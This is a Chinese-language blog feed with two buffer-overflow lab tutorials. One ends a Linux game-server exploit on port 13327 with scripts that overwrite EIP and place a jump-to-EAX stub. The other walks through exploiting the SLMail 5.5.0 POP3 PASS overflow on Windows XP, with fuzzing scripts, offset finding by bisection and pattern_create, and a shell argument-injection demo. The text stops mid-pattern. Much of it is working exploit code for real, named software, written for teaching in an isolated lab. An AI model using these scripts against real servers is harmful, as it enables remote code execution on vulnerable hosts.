<p><strong>• ESP 跳转到EAX</strong></p>
<p><strong>• 偏移 12 个字节 （因为setup
sound为服务器指令，所以前十二个字符须先发送setup sound）</strong></p>
<p><strong>• setup sound shellcode2</strong></p>
<p><strong>注意：
常规想法是直接对EIP进行修改，让EIP直接跳转到EAX上，然后在EAX的地址上加上12，可实现跳转执行shellcode，但是不同系统的EAX地址可能不一样，不具普适性，所以此处是在ESP中实现EAX跳转和偏移12位字符的。</strong></p>
<p><strong>汇编指令：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/usr/share/metasploit-framework/tools/exploit]</span><br><span class="line">└─<span class="comment"># ./nasm_shell.rb                        </span></span><br><span class="line">nasm &gt; add eax,12　　　　　　<span class="comment">#eax偏移12字符</span></span><br><span class="line">00000000  83C00C            add eax,byte +0xc</span><br><span class="line">nasm &gt; jmp eax</span><br><span class="line">00000000  FFE0              jmp eax</span><br></pre></td></tr></table></figure>
<p><strong>即ESP可存：
0c（由于必须是7个字符（字节），所以在后面补2个nop）</strong></p>
<p><strong>04.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">crash=<span class="string">&quot;\x41&quot;</span>*<span class="number">4368</span> + <span class="string">&#x27;B&#x27;</span>*<span class="number">4</span> + <span class="string">&#x27;\x83\xc0\x0c\xff\xe0\x90\x90&#x27;</span></span><br><span class="line">buffer = <span class="string">&quot;\x11(setup sound &quot;</span> +crash+ <span class="string">&quot;\x90\x00#&quot;</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*] Sending evil buffer...&quot;</span></span><br><span class="line">s.connect((host,<span class="number">13327</span>))</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span> data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*] Payload Send&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>验证：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220131154453485-177900808.png" /></p>
<p>OK！</p>
<h3 id="确定-eip-内容">8、确定 EIP 内容</h3>
<p><strong>由于ESP也是变化的，所以EIP不能直接存放ESP地址。</strong></p>
<p><strong>寻找 ESP 的</strong> <strong>跳转地址</strong></p>
<p><strong>• 所用插件 Opcode serach</strong> <strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220131160112908-1895988215.png" /></strong></p>
<p><strong>即EIP：08134596（注意地址要反转）</strong></p>
<p><strong>05.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">crash = <span class="string">&quot;\x41&quot;</span> * <span class="number">4368</span> + <span class="string">&quot;\x96\x45\x13\x08&quot;</span>+ <span class="string">&quot;\x83\xc0\x0c\xff\xe0\x90\x90&quot;</span></span><br><span class="line">buffer = <span class="string">&quot;\x11(setup sound &quot;</span> +crash+ <span class="string">&quot;\x90\x00#&quot;</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*] Sending evil buffer...&quot;</span></span><br><span class="line">s.connect((host,<span class="number">13327</span>))</span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span> data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*] Payload Send&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>验证：</strong></p>
<p><strong>设置断点</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220131160938997-263266333.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220131161426214-236874730.png" /></p>
<p><strong>执行</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220131161959176-1455937852.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220131162946165-727108417.png" /></p>
<h3 id="查找坏字符">9、查找坏字符</h3>
<p><strong>查找方法同：<a
href="https://www.cnblogs.com/z9m8r8/articles/15850634.html"
class="uri">https://www.cnblogs.com/z9m8r8/articles/15850634.html</a></strong></p>
<p><strong>坏字符有：0a0d</strong></p>
<h3 id="shellcode-实战">10、shellcode 实战</h3>
<p><strong>方法雷同：<a
href="https://www.cnblogs.com/z9m8r8/articles/15850634.html"
class="uri">https://www.cnblogs.com/z9m8r8/articles/15850634.html</a>（注意，shellcode加进去之后修改'A'的数量，使得crash大小为4379），不再演示！</strong></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>缓冲区溢出</category>
      </categories>
      <tags>
        <tag>缓冲区溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>缓冲区溢出之WINDOWS实例</title>
    <url>/2022/01/28/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%B9%8BWINDOWS%E5%AE%9E%E4%BE%8B/</url>
    <content><![CDATA[<h2 id="程序漏洞从哪里来">1. 程序漏洞从哪里来</h2>
<p><strong>• 罪恶的根源：变量</strong></p>
<p><strong>• 数据与代码边界不清</strong></p>
<p><strong>• 根源在于对输入的数据未做检查或检查机制不完善！</strong></p>
<p><strong>• 最简漏洞原理---- shell脚本漏洞</strong></p>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop/tests<span class="comment"># cat a.sh </span></span><br><span class="line"><span class="comment">#!/bin/bash　　　　　　#指定解释器  </span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$1</span></span><br><span class="line">root@kali:~/Desktop/tests<span class="comment"># ./a.sh 1</span></span><br><span class="line">1</span><br><span class="line">root@kali:~/Desktop/tests<span class="comment"># ./a.sh Hello world!</span></span><br><span class="line">Hello</span><br><span class="line">root@kali:~/Desktop/tests<span class="comment"># ./a.sh &quot;Hello world!&quot;</span></span><br><span class="line">Hello world!</span><br><span class="line">root@kali:~/Desktop/tests<span class="comment"># ./a.sh ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">root@kali:~/Desktop/tests<span class="comment"># ./a.sh ;ls　　　　#对输入的参数未做检查直接执行了 2.jpg  a.sh exploits  wireshark.pcapng</span></span><br><span class="line">root@kali:~/Desktop/tests<span class="comment"># ./a.sh ;pwd　　　　#同上</span></span><br><span class="line"></span><br><span class="line">/root/Desktop/tests</span><br></pre></td></tr></table></figure>
<h2 id="缓冲区溢出">2. 缓冲区溢出</h2>
<p>•
当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被"撑暴"，从而覆盖了相邻内存区域的数据；</p>
<p>•
成功修改内存数据，可造成进程劫持，执行恶意代码，获取服务器控制权等后果</p>
<p>• <strong>缓冲区溢出原理：</strong><a
href="http://www.cnblogs.com/fanzhidongyzby/archive/2013/08/10/3250405.html"
class="uri">http://www.cnblogs.com/fanzhidongyzby/archive/2013/08/10/3250405.html</a></p>
<p><strong>如何发现漏洞？</strong></p>
<p><strong>• 源码审计</strong></p>
<p><strong>• 逆向工程</strong></p>
<p><strong>• 模糊测试</strong></p>
<p><strong>• 向程序堆栈半随机的数据，根据内存变化判断溢出</strong></p>
<p><strong>• 数据生成器：生成随机、半随机数据</strong></p>
<p><strong>• 测试工具：识别溢出漏洞</strong></p>
<h2 id="windows-缓冲区溢出">3. WINDOWS 缓冲区溢出</h2>
<h3 id="实验环境及工具">1、实验环境及工具</h3>
<p><strong>• kali 2019.3</strong></p>
<p><strong>• Windows_xp_sp3</strong></p>
<p><strong>• SLMail 5.5.0 Mail Server</strong></p>
<p>• 下载：<a href="https://slmail.software.informer.com/download/"
class="uri">https://slmail.software.informer.com/download/</a></p>
<p><strong>• ImmunityDebugger_1_85_setup.exe</strong></p>
<p>•
下载：&lt;https://www.softpedia.com/get/Programming/Debuggers-Decompilers-
Dissasemblers/Immunity-Debugger.shtml&gt;</p>
<p>• 动态调试工具，可调用python脚本,使用python2.7环境</p>
<p><strong>• mona.py</strong></p>
<p>• 下载：<a href="https://github.com/corelan/mona"
class="uri">https://github.com/corelan/mona</a></p>
<p>• 手册：<a
href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/"
class="uri">https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/</a></p>
<p><strong>• RegSnap</strong></p>
<p>• 下载：<a href="https://www.onlinedown.net/soft/38491.htm"
class="uri">https://www.onlinedown.net/soft/38491.htm</a></p>
<h3 id="slmail-5.5.0-mail-server-安装"><strong>2、SLMail 5.5.0 Mail
Server 安装</strong></h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173454005-965500081.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173504272-1091448359.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173513873-405319817.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173524721-294796552.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173538936-348244788.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173550236-414274462.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173600079-137155035.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173626033-936282232.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127200732802-1358583795.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173817893-569737845.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127183710735-1705811640.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127182047410-69357115.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173929942-44265857.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127173941403-924529866.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127183845721-526593658.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127183919695-1140411592.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127183948043-2043212847.png" /></p>
<p><strong>检查安装结果：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127200936047-72348839.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127174013031-1434788656.png" /></p>
<h3
id="immunitydebugger_1_85_setup.exe的安装"><strong>3、ImmunityDebugger_1_85_setup.exe的安装</strong></h3>
<p><strong>略</strong></p>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127202653197-618726388.png" /></strong></p>
<h3 id="mona.py安装"><strong>4、 mona.py安装</strong></h3>
<p><strong>mona.py直接放在
ImmunityDebugger_1_85_setup.exe安装路径下的PyCommands路径下（如下图）</strong></p>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127174146930-2118627038.png" /></strong></p>
<h3 id="环境测试"><strong>5、环境测试：</strong></h3>
<p><strong>注意：将winxp_sp3防火墙关闭或开放26（smtp一般默认为25），110（pop3）等端口方可实验！</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop/tests<span class="comment"># nc 10.10.10.131 26</span></span><br><span class="line">220 test.com SMTP Server SLmail 5.5.0.4433 Ready ESMTP spoken here</span><br><span class="line">hello</span><br><span class="line">500 Syntax error, <span class="built_in">command</span> unrecognized</span><br><span class="line">ok</span><br><span class="line">500 Syntax error, <span class="built_in">command</span> unrecognized</span><br><span class="line">quit</span><br><span class="line">221 test.com Service closing transmission channel</span><br><span class="line">root@kali:~/Desktop/tests<span class="comment"># nc 10.10.10.131 110</span></span><br><span class="line">+OK POP3 server test.com ready &lt;00003.1081687@test.com&gt;</span><br><span class="line">USER z9m8r8</span><br><span class="line">+OK z9m8r8 welcome here</span><br><span class="line">PASS <span class="built_in">test</span></span><br><span class="line">-ERR invalid password</span><br><span class="line">quit</span><br><span class="line">+OK POP3 server test.com signing off.</span><br></pre></td></tr></table></figure>
<h3 id="slmail-5.5.0-mail-server"><strong>6、SLMail 5.5.0 Mail
Server</strong></h3>
<p>• ports：25 110 139 8376</p>
<p>• POP3 PASS 命令存在缓冲区溢出漏洞</p>
<p>• 无需身份验证实现远程代码执行</p>
<p>• DEP：阻止代码从数据页被执行</p>
<p>• ASLR：随机内存地址加载执行程序和DLL，每次重启地址变化</p>
<h3 id="fuzzing">7、FUZZING</h3>
<h4 id="pop3">7.0 POP3</h4>
<p>• Nc 110端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop/tests<span class="comment"># nc 10.10.10.131 110</span></span><br><span class="line">+OK POP3 server test.com ready &lt;00003.1081687@test.com&gt;</span><br><span class="line">USER z9m8r8</span><br><span class="line">+OK z9m8r8 welcome here</span><br><span class="line">PASS <span class="built_in">test</span></span><br><span class="line">-ERR invalid password</span><br><span class="line">quit</span><br><span class="line">+OK POP3 server test.com signing off.</span><br></pre></td></tr></table></figure>
<p>• 如何了解应用/协议能接受的固定指令</p>
<p>• Wireshark</p>
<p>• RFC</p>
<p><strong>01.py：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">   s.connect((<span class="string">&quot;10.10.10.131&quot;</span>,<span class="number">110</span>))</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)               <span class="comment">###将110端口返回的数据显示在屏幕中</span></span><br><span class="line">   <span class="built_in">print</span> data</span><br><span class="line"> </span><br><span class="line">   s.send(<span class="string">&quot;USER z9m8r8&quot;</span>+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   <span class="built_in">print</span> data</span><br><span class="line"> </span><br><span class="line">   s.send(<span class="string">&quot;PASS test\r\n&quot;</span>)</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   <span class="built_in">print</span> data</span><br><span class="line"> </span><br><span class="line">   s.close()</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nDone&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>测试：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop/tests<span class="comment"># ./01.py </span></span><br><span class="line"></span><br><span class="line">Sending evil buffer...</span><br><span class="line">+OK POP3 server test.com ready &lt;00002.960781@test.com&gt;</span><br><span class="line"></span><br><span class="line">+OK z9m8r8 welcome here</span><br><span class="line"></span><br><span class="line">-ERR invalid password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Done</span><br></pre></td></tr></table></figure>
<h4 id="测试-pass-命令接收到大量数据时是否会溢出">7.1 测试 PASS
命令接收到大量数据时是否会溢出</h4>
<p><strong>• EIP 寄存器存放下一条指令的地址</strong></p>
<p><strong>02.py：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">buffer=[<span class="string">&quot;A&quot;</span>]</span><br><span class="line">counter=<span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(buffer) &lt;= <span class="number">50</span>:</span><br><span class="line">    buffer.append(<span class="string">&quot;A&quot;</span>*counter)</span><br><span class="line">    counter=counter+<span class="number">200</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Fuzzing PASS with %s bytes&quot;</span> % <span class="built_in">len</span>(string)</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    connect = s.connect((<span class="string">&quot;10.10.10.131&quot;</span>,<span class="number">110</span>))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">&quot;USER z9m8r8&quot;</span>+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">&quot;PASS &quot;</span>+string+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    s.send(<span class="string">&quot;QUIT\r\n&quot;</span>)</span><br><span class="line">    s.close()</span><br></pre></td></tr></table></figure>
<p><strong>测试：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127203116758-220099230.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127203149085-1636934061.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127203200218-1673562821.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127203210318-174706287.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127204307247-360998766.png" /></p>
<p><strong>winxp_sp3状态：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127204415456-1345972743.png" /></p>
<p><strong>由上图知 PASS 命令接收到大量数据时会溢出，EIP
寄存器地址亦被覆盖。</strong></p>
<h4 id="确定寻找覆盖eip地址的4-个字节">7.2 确定（寻找）覆盖EIP地址的4
个字节</h4>
<p><strong>（1）二分法</strong></p>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop/tests<span class="comment"># cat 03.py </span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">&#x27;A&#x27;</span> * **2600**</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">   s.connect((&quot;<span class="number">10.10</span>.<span class="number">10.131</span>&quot;,<span class="number">110</span>))</span><br><span class="line">   data = s.recv(1024)</span><br><span class="line">   s.send(<span class="string">&quot;USER z9m8r8&quot;</span>+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   data = s.recv(1024)</span><br><span class="line">   s.send(<span class="string">&quot;PASS &quot;</span>+buffer+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nDone!.&quot;</span></span><br><span class="line">except:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br><span class="line">root@kali:~/Desktop/tests<span class="comment"># ./03.py </span></span><br><span class="line"></span><br><span class="line">Sending evil buffer...</span><br><span class="line"></span><br><span class="line">Done!.</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127205955379-1541230790.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop/tests<span class="comment"># cat 03.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">&#x27;A&#x27;</span> * 2700</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">   s.connect((&quot;<span class="number">10.10</span>.<span class="number">10.131</span>&quot;,<span class="number">110</span>))</span><br><span class="line">   data = s.recv(1024)</span><br><span class="line">   s.send(<span class="string">&quot;USER z9m8r8&quot;</span>+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   data = s.recv(1024)</span><br><span class="line">   s.send(<span class="string">&quot;PASS &quot;</span>+buffer+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nDone!.&quot;</span></span><br><span class="line">except:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br><span class="line">root@kali:~/Desktop/tests<span class="comment"># ./03.py </span></span><br><span class="line"></span><br><span class="line">Sending evil buffer...</span><br><span class="line"></span><br><span class="line">Done!.</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127210424990-1905992355.png" /></p>
<p><strong>推得EIP在2600~2700之间，不断用二分法即可得出EIP的精确位置！</strong></p>
<p><strong>（2）唯一字串法</strong></p>
<p><strong>生成唯一字符串</strong> （每 4 个字节都是不一样的）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit<span class="comment"># ./pattern_create.rb -l 2700</span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1D